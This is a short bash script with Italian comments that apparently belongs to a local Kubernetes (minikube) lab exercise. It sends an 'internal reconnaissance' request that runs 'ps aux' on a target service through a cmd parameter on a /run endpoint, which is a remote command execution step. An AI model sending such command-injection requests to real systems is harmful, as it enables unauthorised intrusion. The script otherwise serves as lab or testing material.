#!/bin/bash
TARGET=http://$(minikube ip):30080
echo "[*] Eseguo ricognizione interna (ps aux)"
curl "$TARGET/run?cmd=ps+aux"
